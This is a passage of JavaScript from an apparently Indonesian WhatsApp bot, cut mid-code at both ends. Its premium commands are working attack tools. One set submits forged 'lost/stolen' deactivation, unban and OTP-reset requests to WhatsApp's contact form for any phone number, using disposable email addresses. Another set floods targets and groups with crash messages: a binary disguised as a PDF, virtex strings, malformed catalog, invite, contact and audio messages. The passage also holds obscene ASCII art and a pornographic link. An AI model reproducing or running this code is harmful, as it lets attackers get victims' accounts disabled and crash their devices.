            frequency_penalty: 0.5,
            presence_penalty: 0
        })
            reply(response.data.choices[0].text)
    }
break

// BUG VERIF //
case "verif": 
case "bye":
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example : ${prefix+command} nomor indo/luar|INFOKODENERGARA\n Contoh : ${prefix+command} 186139482773|US\nMau Liat list negara disini\nhttps://id.m.wikipedia.org/wiki/ISO_3166-1`)
var numm = q.split('|')[0]
var negarane = q.split('|')[1]
  var axioss = require ("axios")
  var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
var $ = cheerio.load(ntah.data)
var $form = $("form");
var urlnya = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", negarane)
form.append("phone_number", numm)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
var res = await axioss({
  url: urlnya,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
lexx.sendMessage(msg.chat, { text: util.format(res.data)}, { quoted: msg })
break

case "unbanned":
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example : ${prefix+command} nomor indo/luar|INFOKODENERGARA\n Contoh : ${prefix+command} 186139482773|US\nMau Liat list negara disini\nhttps://id.m.wikipedia.org/wiki/ISO_3166-1`)
var numm = q.split('|')[0]
var negarane = q.split('|')[1]
  var axioss = require ("axios")
  var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
var $ = cheerio.load(ntah.data)
var $form = $("form");
var urlnya = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", negarane)
form.append("phone_number", numm)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Whatsaap Mohon Bantuannya,Beberapa hari Ini whatsapp Saya di salah gunakan Oleh Orang lain Yang tidak bertanggung jawab dan tanpa sepengetahuan saya menginstal aplikasi whatsapp Modifikasi,sehingga nomor whatsapp saya terblokir.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
var ress = await axioss({
  url: urlnya,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
lexx.sendMessage(msg.chat, { text: util.format(ress.data)}, { quoted: msg })
break
case "resetotp":
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example : ${prefix+command} nomor indo/luar|INFOKODENERGARA\n Contoh : ${prefix+command} 186139482773|US\nMau Liat list negara disini\nhttps://id.m.wikipedia.org/wiki/ISO_3166-1`)
var numm = q.split('|')[0]
var negarane = q.split('|')[1]
  var axioss = require ("axios")
  var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
var $ = cheerio.load(ntah.data)
var $form = $("form");
var urlnya = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", negarane)
form.append("phone_number", numm)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Por favor, pesquise o código OTP para este número porque outra pessoa acidentalmente se conectou com meu número e eu tive que esperar 8 horas, por favor, pesquise novamente neste número: [+${numm}].`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
var ress = await axioss({
  url: urlnya,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
lexx.sendMessage(msg.chat, { text: util.format(ress.data)}, { quoted: msg })
break
// DISARANKAN BOT MAKE 0 CTT DAN IMMUNE BIAR GAK CRASH

// ATTACK GRUP //
case 'join':{
if (!isOwner) return msg.reply('Owner Only')
if (!q) return msg.reply(`Penggunaan ${prefix+command} linkgrup`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return msg.reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
lexx.groupAcceptInvite(result).then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
}
break
case 'kataloggc': {
if (!isPremium) return reply(OnlyPrem)
reply(`Otewe!`)
if (!q) return reply(`#Example : ${prefix+command} link`)
var result = args[0].split('https://chat.whatsapp.com/')[1]
var jumlahnye = '5'
var kir = await lexx.groupAcceptInvite(result)
for (let i = 0; i < jumlahnye; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/kaze.jpeg') }, { upload: lexx.waUploadToServer })
var catalog = generateWAMessageFromContent(msg.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"title": `${buttonkal} ${virtex2}`,
"description": `${buttonkal} ${virtex2}`,
"currencyCode": "IDR",
"footerText": `YTTA`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `${bugsw}`,
"url": "github.com/NYX095"
},
"businessOwnerJid": "6281216465289@s.whatsapp.net",
}
}), { userJid: msg.chat, quoted: vtext})
lexx.relayMessage(kir, catalog.message, { messageId: catalog.key.id })
}
}
break
case 'santetgc':
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example : ${prefix+command} linkgrup`)
reply('Otewe!')
var result = args[0].split('https://chat.whatsapp.com/')[1]
var Pe = await lexx.groupAcceptInvite(result)
var jumlah = "5"
for (let i = 0; i < jumlah; i++) {
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 }
 reply("Sukses Santetgc!")
break
// BUG WHATSAPP KU TARUH SINI
case 'pdfcrash':{
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example : ${prefix+command} 62xxx\n Contoh : ${prefix+command} 628232848274`)
var num = q.split('|')[0]
var anuin = fs.readFileSync('./virtex/ngeselin.BIN')
lexx.sendMessage(num, { document: anuin, mimetype: 'application/pdf', fileName: `𝑪𝑹𝑨𝑺𝑯 ${place}.pdf`, title: `𝑪𝑹𝑨𝑺𝑯.pdf` }, { quoted: vtext })
reply(`Sukses Mengirimkan Bug Kepada @${q}`)
}
break
case 'jagoan': {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 var message = {
document : fs.readFileSync("./virtex/ngeselin.BIN"),
"fileName": `🔥 Kontolodon ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
caption: ` Kontolodon  ${buttonkal} ${virtex2}`,
footer: ` Kontolodon `,
mentionedJid: msg.mentionedJid,
templateButtons: [{ urlButton: {displayText: `Kontolodon`, url: 'www.xnxx.com'}}, 
{ quickReplyButton: { displayText: `Fek`, id: `.bugcrot ${teks}️`}},
{ quickReplyButton: { displayText: `Ril`, id: `.button853 ${teks}`}},
{ quickReplyButton: { displayText: `or`, id: `.payment ${teks}`}},
{ quickReplyButton: { displayText: `ygy `, id: '.jadikatalog y'}}],
headerType: 5
}
lexx.sendMessage(teks, message, { quoted:vtext })
}
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break
case 'ginvite': 
if (!isPremium) return reply(OnlyPrem)
var Pe = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/kaze.jpeg') }, { upload: lexx.waUploadToServer })
var groupInvite = generateWAMessageFromContent(msg.chat, proto.Message.fromObject({ "groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME NYX WANGSAP ${ngazap(prefix)}`,
"groupName": `MY NAME NYX WANGSAP ${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: msg.chat, quoted: vtext })
lexx.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break

case 'titid' : {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example: ${prefix+command} Nomor\nContoh: ${prefix+command} 6282748274828`)
var teks = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var titid = `PELER
⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿
⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿
⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿
⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿
⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿
⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊
`
var a = await lexx.sendMessage(teks, {react: { text: " ️", key: { remoteJid: teks, fromMe: true, id : msg.key.id}}})
lexx.sendMessage(teks, {text: `${titid} ${buttonkal}`}, {quoted: vtext})
lexx.sendMessage(teks, {text: `${titid} ${place}`}, {quoted: vtext})
lexx.sendMessage(teks, {text: `${titid} ${buttonvirus}`}, {quoted: vtext})
lexx.sendMessage(teks, {text: `${titid} ${iphone3}`}, {quoted: vtext})
lexx.sendMessage(teks, {text: `${titid} ${virtex2}`}, {quoted: vtext})
lexx.sendMessage(teks, {text: `${titid} ${virtex3} `}, {quoted: vtext})
lexx.sendMessage(teks, {text: `${titid} ${vipi}`}, {quoted: vtext})
lexx.sendMessage(teks, {text: `${titid} ${ngazap(prefix)}`}, {quoted: vtext})
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
}
break
case 'vweb': 
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example: ${prefix+command} Nomor\nContoh: ${prefix+command} 6282748274828`)
var teks = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var web = generateWAMessageFromContent(teks, {
"extendedTextMessage": {
"text": `${buttonkal}`,
"matchedText": "https://instagram.com/hikal_857",
"description": "Undangan Grup WhatsApp",
"title": `𝐶𝑅𝐴𝑆𝐻 𝐷𝐸𝐶𝐾?🥵-${place}`,
"previewType": "NONE",
"contextInfo": {
"externalAdReply": {
"showAdAttribution": true,
}}
}
}, {quoted: vtext, contextInfo:{}})
lexx.relayMessage(teks, web.message, { messageId: web.key.id,})
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break
case 'vwebpage': {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example: ${prefix+command} Nomor\nContoh: ${prefix+command} 6282748274828`)
var teks = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
lexx.sendMessage(teks, { text: `${virtex3}${place}`, contextInfo: { "externalAdReply": { "title": `${virtex2} ${buttonkal}`, "body": `© ${vipi} ${ngazap(prefix)}`, "previewType": "PHOTO", "thumbnailUrl": `https://github.com/NYX095`, "thumbnail": thumb, "sourceUrl": `https://github.com/NYX095` } } }, { quoted: vkatalog })
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
}
break
case 'audio': {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example: ${prefix+command} nomor\nContoh: ${prefix+command} 6283826482737`)
var ydd = `YTTA YGY`
var teks = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var audio = generateWAMessageFromContent(teks, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: msg.chat, quoted: vkatalog })
lexx.relayMessage(teks, audio.message, { messageId: audio.key.id })
await sleep(20)
lexx.relayMessage(teks, audio.message, { messageId: audio.key.id })
await sleep(20)
lexx.relayMessage(teks, audio.message, { messageId: audio.key.id })
await sleep(20)
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
}
break
case 'virkon': {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example: ${prefix+command} nomor\nContoh: ${prefix+command} 6283826482737`)
var teks = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var ydd = `YTTA YGY`
var contact = generateWAMessageFromContent(teks, proto.Message.fromObject({
"contactMessage": {
"displayName": `© WANGSAF ${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© NYX WANGSAP͢\nitem1.TEL;waid=6281216465289:+62 812-1646-5289\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer © NYX WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:© YTTA\nEND:VCARD",
}
}), { userJid: msg.chat, quoted: vtext })
lexx.relayMessage(teks, contact.message, { messageId: contact.key.id })
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
}
break
case 'allvirtex': {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example : ${prefix+command} 62xxx\n Contoh : ${prefix+command} 6282328482747`)
var Pe = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var titid = `PELER
⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿
⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿
⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿
⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿
